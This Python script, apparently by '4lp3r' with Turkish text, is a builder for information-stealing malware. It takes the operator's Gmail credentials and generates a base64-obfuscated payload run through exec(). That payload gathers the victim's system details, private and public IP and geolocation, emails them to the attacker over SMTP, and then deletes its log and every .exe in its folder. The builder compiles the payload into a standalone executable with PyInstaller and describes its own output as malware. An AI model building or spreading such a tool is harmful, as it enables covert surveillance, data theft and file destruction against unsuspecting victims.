#!/usr/bin/python3
# -*- coding: utf-8 -*-
__author__ = '4lp3r'

import base64,json,os,platform,sys,time

try:
    with open("bilgiler.json", "r", encoding="utf-8") as bilgiler:
       resp = bilgiler.read()
except:
    pass

path = os.getcwd()
extend = os.sep
merge = path+extend
bilgiler = "bilgiler.json"
stop = False

def scanningAnimation(text):
    global stop
    i = 0
    temp = 0
    while stop is not True:
        tempText = list(text)
        if i >= len(tempText):
            i = 0
        if temp > 100:
            break
        tempText[i] = tempText[i].upper()
        tempText = ''.join(tempText)
        sys.stdout.write(tempText + '\r')
        sys.stdout.flush()
        i += 1
        temp += 1
        time.sleep(0.1)

def banner():
    ban = """
           █████▒▒█████   █    ██  ██▀███      ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  ▒███████▒
         ▓██   ▒▒██▒  ██▒ ██  ▓██▒▓██ ▒ ██▒   ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒ ▒ ▒ ▄▀░
         ▒████ ░▒██░  ██▒▓██  ▒██░▓██ ░▄█ ▒   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒░ ▒ ▄▀▒░ 
         ░▓█▒  ░▒██   ██░▓▓█  ░██░▒██▀▀█▄     ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄    ▄▀▒   ░
         ░▒█░   ░ ████▓▒░▒▒█████▓ ░██▓ ▒██▒   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒▒███████▒
          ▒ ░   ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░░▒▒ ▓░▒░▒
          ░       ░ ▒ ▒░ ░░▒░ ░ ░   ░▒ ░ ▒░    ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░░░▒ ▒ ░ ▒
          ░ ░   ░ ░ ░ ▒   ░░░ ░ ░   ░░   ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ ░ ░ ░ ░ ░
                    ░ ░     ░        ░         ░  ░  ░      ░  ░░ ░      ░  ░      ░  ░   ░       ░ ░    
                                                                ░                               ░        

                                @@@   @@@       @@@@@@@   @@@@@@   @@@@@@@   
                               @@@@   @@@       @@@@@@@@  @@@@@@@  @@@@@@@@  
                              @@!@!   @@!       @@!  @@@      @@@  @@!  @@@  
                             !@!!@!   !@!       !@!  @!@      @!@  !@!  @!@  
                            @!! @!!   @!!       @!@@!@!   @!@!!@   @!@!!@!   
                           !!!  !@!   !!!       !!@!!!    !!@!@!   !!@!@!    
                           :!!:!:!!:  !!:       !!:           !!:  !!: :!!   
                           !:::!!:::   :!:      :!:           :!:  :!:  !:!  
                                :::    :: ::::   ::       :: ::::  ::   :::  
                                :::   : :: : :   :         : : :    :   : :  
    """
    return ban

if platform.system().lower().startswith("win"):
    clear = lambda : os.system("cls")
else:
    clear = lambda : os.system("clear")

print(banner())
scanningAnimation("[+] Araç Başlatılıyor Kemerleri Bağlayın...")
clear()
print(banner())

def installPyinstaller():
    sistem = platform.system()
    sistem.encode("utf-8")
    cmd_linux = "pip3 install pyinstaller"
    cmd_windows = "pip install pyinstaller"
    if sistem.lower().startswith("win"):
        succes("İşletim sistemi Windows olarak belirlendi !")
        os.system(cmd_windows)
    else:
        succes("İşletim sistemi mac,linux vb. bir sistem olarak belirlendi !")
        os.system(cmd_linux)

def usePyinstaller(file_name):
    sistem = platform.system()
    if sistem.lower().startswith("win"):
        os.system(f"pyinstaller -F {str(file_name)}")
    else:
        os.system(f"pyinstaller -F {str(file_name)}")

def succes(msg):
    print(f"[+] {msg}")

def error(msg):
    print(f"[!] {msg}")

def write_file(writeable):
    with open(file_name, "w", encoding="utf-8") as file123:
        file123.write(writeable)

def deleteFolders(*folders):
    sistem = platform.system()
    if sistem.lower().startswith("win"):
        delete = lambda ff: os.system(f"DEL /S /F /Q /A {ff}")
    else:
        delete = lambda ff: os.system(f"rm -r {ff}")
    for folder in folders:
        delete(folder)

def copyFiles(*files):
    sistem = platform.system()
    if sistem.lower().startswith("win"):
        copy = lambda veri: os.system(f"copy {merge+'dist'+extend+file_name[:-3]+'.exe'} {merge}")
    else:
        copy = lambda veri: os.system(f"cp {merge+'dist'+extend+'*'} {merge}")
    for fil in files:
        copy(fil)

if os.path.exists(merge+bilgiler):
    succes("bilgiler.json bulundu !")
    veriler = json.loads(resp)
    fromaddr = veriler["bilgiler"]["from"]
    toaddr = veriler["bilgiler"]["to"]
    pwd = veriler["bilgiler"]["password"]
    succes("bilgiler.json daki bilgiler seçildi !")
else:
    error("bilgiler.json bulunamadı !")
    print("""
    --------------------------------  UYARI  --------------------------------
      Lütfen bilgileri gönderecek GMAİL hesabınızda 2 faktörlü doğrulamayı açın.
      Ardından aşağıda verdiğim linkten bir uygulama şifresi seçin ve burda size
      sorulacak olan şifre kısmına girin.
      Link: https://myaccount.google.com/apppasswords
      NOT: Hesabınızın çalınması gibi bir durum yoktur lakin güvenmiyorsanız
      fake hesap açarakta yapabilirsiniz...
      
    """)
    toaddr = input("Bilgilerin gönderileceği mail adresi: ")
    fromaddr = input("Bilgileri gönderecek mail adresi: ")
    pwd = input("Bilgileri gönderecek mail adresinin şifresi: ")
    with open("bilgiler.json","w",encoding="utf-8") as file:
        llwrite = '''
{"bilgiler": {
    "from": "'''+str(fromaddr)+'''",
    "password": "'''+str(pwd)+'''",
    "to": "'''+str(toaddr)+'''"
  }
}
        '''
        file.write(llwrite)
        succes("bilgiler.json kaydedildi !")
file_name = input("Dosya adı (uzantı girmeyin otomatik olarak girilecek): ")+".py"
imports = "import os,platform,socket,smtplib,locale,datetime,urllib.request,json,base64;from email.mime.multipart import MIMEMultipart;from email.mime.text import MIMEText;"
code = f'''
try:
    os.remove("filelog.txt")
except:
    pass
extend = os.sep
path = os.getcwd()
merge = path+extend
dosyalar_klasörler = []
dosyalar = []
exeler = []
file_name = "filelog.txt"
fromaddr = "{str(fromaddr)}"
toaddr = "{str(toaddr)}"
pwd = "{str(pwd)}"'''+'''
def write_file(body):
    try:
        with open(file_name, "a", encoding="utf-8") as mf:
            mf.write(body)
    except:
        pass
def read_file():
    try:
        with open(file_name, "r", encoding="utf-8") as mf:
            return mf.read()
    except:
        pass
def deleter(*files):
    for file in files:
        try:
            os.remove(merge + file)
        except:
            pass
def succes(message):
    try:
        main = "[+] " + message + "\\n"
        write_file(main)
    except:
        pass
def raw(msg):
    try:
        write_file(msg)
    except:
        pass
def _dati():
    try:
        locale.setlocale(locale.LC_ALL, "")
        dt = datetime.datetime
        now = dt.now()
        gün, ay, yıl = dt.strftime(now, "%A"), dt.strftime(now, "%B"), dt.strftime(now, "%Y")
        ggaayy = dt.strftime(now, '%D')
        aa = ggaayy[0] + ggaayy[1]
        gg = ggaayy[3] + ggaayy[4]
        yy = ggaayy[6] + ggaayy[7]
        time = dt.strftime(now, "%X")
        slash = "/"
        dati = gg + slash + aa + slash + yy + " " + time + " (" + gün + " " + ay + " " + yıl + ") " + "NOTE: date = DD/MM/YY\\n"
        return dati
    except:
        pass
def getFiles(*args):
    try:
        # Dosyayı yazdır (eğer dosyaysa)
        if not args:
            for dosya in os.listdir(os.curdir):
                dosyalar_klasörler.append(dosya)
            for dd in dosyalar_klasörler:
                if os.path.isfile(merge + dd):
                    print(dd)
                    dosyalar.append(dd)
                else:
                    pass
        # Dosyaları ve klasörleri ekleme
        else:
            for dosya in os.listdir(os.curdir):
                dosyalar_klasörler.append(dosya)
            for dd in dosyalar_klasörler:
                if os.path.isfile(merge + dd):
                    dosyalar.append(dd)
                else:
                    pass
    except:
        pass
def isExe(*files):
    try:
        for file in files:
            dosya, uzantı = os.path.splitext(file)
            if str(uzantı) == ".exe":
                exeler.append(dosya + uzantı)
            else:
                pass
    except:
        pass
def deleteAllExe():
    try:
        getFiles("arguman")
        for dosya in dosyalar:
            isExe(dosya)
            for exe in exeler:
                exeler.remove(exe)
                deleter(exe)
    except:
        pass
def deleteAllMalwareFiles():
    try:
        deleter(file_name)
        getFiles("arg")
        deleteAllExe()
    except:
        pass
def sendMail(fromad,alici, konu, msg):
    try:
        sender = fromaddr
        password = pwd
        mesaj = MIMEMultipart()
        msg = str(msg)
        alici = str(alici)
        konu = str(konu)
        mesaj["From"] = fromad
        mesaj["To"] = alici
        mesaj["Subject"] = konu
        txt = msg
        govde = MIMEText(txt, "plain")
        mesaj.attach(govde)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(sender, password)
        s.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
        s.close()
    except:
        pass
def getSystemInfo():
    try:
        system = platform.system()
        arch = platform.architecture()[0]
        system_details = platform.platform()
        version = platform.version()
        machine = platform.machine()
        proc = platform.processor()
        release = platform.release()
        pyversion = platform.python_version()
        pycompiler = platform.python_compiler()
        pybranch = platform.python_branch()
        pybuild = platform.python_build()
        ossys = platform.node()
        raw(
            "++++++++++++++++++++++++++++++++++++++++++++++++++++ SYSTEM INFO ++++++++++++++++++++++++++++++++++++++++++++++++++++\\n")
        succes(f"Sistem: {system} {arch}   Detay: {system_details}")
        succes(f"Versiyon: {version}")
        succes(f"Makine: {machine}")
        succes(f"İşlemci: {proc}")
        succes(f"İşletim Sistemi: {ossys}")
        succes(f"Release: {release}")
        succes(f"Python Versiyon: {pyversion}")
        succes(f"Python Compiler: {pycompiler}")
        succes(f"Python Branch: {pybranch}")
        succes(f"Python Build: {pybuild}")
        raw(
            "++++++++++++++++++++++++++++++++++++++++++++++++++++ END OF SYSTEM INFO ++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\\n")
    except:
        pass
def getInternetInfo():
        try:
            http = urllib
            def request(url):
                r = http.request.urlopen(url=url)
                return json.loads(r.read().decode("utf-8"))
            def get(url):
                r = http.request.urlopen(url=url)
                veri = str(r.read().decode("utf-8"))
                return veri
            api = "http://ip-api.com/json/"
            url = "https://icanhazip.com"
            hostname = socket.gethostname()
            priv_ip = socket.gethostbyname(hostname)
            public_ip = get(url=url)
            other = request(api + public_ip)
            country = other["country"]
            countryCode = other['countryCode']
            region = other["region"]
            regionName = other["regionName"]
            city = other["city"]
            zip = other["zip"]
            lat = other["lat"]
            lon = other["lon"]
            timezone = other["timezone"]
            isp = other["isp"]
            org = other["org"]
            ass = other["as"]
            raw(
                "++++++++++++++++++++++++++++++++++++++++++++++++++++ INTERNET INFO ++++++++++++++++++++++++++++++++++++++++++++++++++++\\n")
            succes(f"Hostname: {hostname}")
            succes(f"Private IP: {priv_ip}")
            succes(f"Public IP: {public_ip}")
            succes(f"Ülke: {country}")
            succes(f"Ülke kısaltması: {countryCode}")
            succes(f"İl: {regionName}")
            succes(f"İl kodu: {region}")
            succes(f"İlçe: {city}")
            succes(f"Zip: {zip}")
            succes(f"Adres verisi (Google da aratın.): {lat}, {lon}")
            succes(f"Time Zone: {timezone}")
            succes(f"ISP: {isp}")
            succes(f"Org: {org}")
            succes(f"As: {ass}")
            raw(
                "++++++++++++++++++++++++++++++++++++++++++++++++++++ END OF INTERNET INFO ++++++++++++++++++++++++++++++++++++++++++++++++++++\\n")
        except:
            pass

try:
    getSystemInfo()
    getInternetInfo()
    sendMail(fromaddr,toaddr, "LOG INFO", f"DATE INFO: {_dati()}{read_file()}")
    deleteAllMalwareFiles()
except:
    pass
'''
code.encode("utf-8")

installPyinstaller()
clear()

encrypted = base64.b64encode(code.encode())
writeable = f'{imports}\nexec(base64.b64decode({encrypted}))'
write_file(writeable)

usePyinstaller(file_name=file_name)
os.remove(file_name)
clear()

if platform.system().lower().startswith("win"):
    copyFiles(file_name[:-3]+'.exe')
else:
    copyFiles(file_name[:-3])
    
succes(f"{file_name} dosyasına veriler yazıldı, şifrelendi ve executable hale geldi !")
succes(f"Oluşturulan zararlı yazılım bulunduğunuz dizine kopyalandı !")
succes("""
-------------------------------------------------  UYARI  -------------------------------------------------
    VERDİĞİNİZ GMAİL HESABININ ÇALINMA GİBİ BİR DURUMU YOKTUR;
        Çünkü siz programa uygulama şifresi veriyorsunuz. (Normal bir şekilde giriş yapılmıyor isterseniz deneyin :D )
        Ayrıca 2 faktörlü doğrulamayı açtınız bu yüzden size gelen kod olmadan giriş yapılamaz.
        
    Eğer dizininizdeki program çalışmazsa programı silin ve dist/ klasörünün içindekini deneyin.
    Eğer yine düzelmezse bilgiler.json u aşağıdaki şekilde düzenleyin (Çift tırnakları silmeyin 
    verilen bilgiler '"' içinde olmalı):
    
    {"bilgiler": {
    "from": "bilgileri gönderecek GMAİL hesabı",
    "password": "2 faktörlü doğrulamanın açık olduğu GMAİL hesabınızdan aldığınız 'Uygulama Şifresi'",
    "to": "bilgilerin geleceği adres"
      }
    }
    
    Hiç bir şekilde düzeltemezseniz mail adresim:
        foursupport@protonmail.com
""")